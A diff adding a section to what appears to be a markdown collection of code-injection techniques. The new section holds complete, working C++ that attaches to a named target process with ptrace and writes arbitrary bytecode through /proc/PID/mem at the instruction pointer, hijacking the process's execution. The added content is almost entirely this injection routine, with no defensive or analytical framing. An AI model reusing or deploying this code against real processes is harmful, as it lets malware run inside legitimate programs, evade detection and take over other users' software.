@@ -96,6 +96,67 @@ int inject(std::vector<unsigned char> bytecode) {
 }
 ```
 
+## `\proc\$PID\mem` write
+
+```cpp
+#include "../static/vars.hpp"
+#include "../search/findpid.hpp"
+#include <cstdio>
+#include <cstring>
+#include <cerrno>
+#include <vector>
+#include <sys/ptrace.h>
+#include <sys/wait.h>
+#include <sys/user.h>
+#include <sys/types.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+int inject(std::vector<unsigned char> bytecode) {
+  pid_t pid = findProcessId(TARGET_PROCESS);
+  if (pid <= 0) return -1;
+
+  if (ptrace(PTRACE_ATTACH, pid, nullptr, nullptr) == -1) return -1;
+
+  int status = 0;
+  if (waitpid(pid, &status, WUNTRACED) == -1) {
+    ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
+    return -1;
+  }
+
+  struct user_regs_struct regs;
+  if (ptrace(PTRACE_GETREGS, pid, nullptr, &regs) == -1) {
+    ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
+    return -1;
+  }
+
+  char memPath[64];
+  // write "/proc/1234/mem" string into memPath buffer
+  snprintf(memPath, sizeof(memPath), "/proc/%d/mem", pid);
+  int memFd = open(memPath, O_RDWR);
+  if (memFd == -1) {
+    ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
+    return -1;
+  }
+
+  // write bytecode to memFd into the address that RIP holds
+  // meaning we retrieve address stored in RIP from user_regs_struct.RIP
+  // and we use that address as an offset to store our bytecode at
+  ssize_t written = pwrite(memFd, bytecode.data(), bytecode.size(), (off_t)regs.rip);
+  if (written != (ssize_t)bytecode.size()) {
+    close(memFd);
+    ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
+    return -1;
+  }
+  close(memFd);
+
+  if (ptrace(PTRACE_DETACH, pid, nullptr, nullptr) == -1) {
+    return -1;
+  }
+  return 0;
+}
+```
+
 ## via NtCreateSection,NtMapViewOfSection
 
 ```cpp
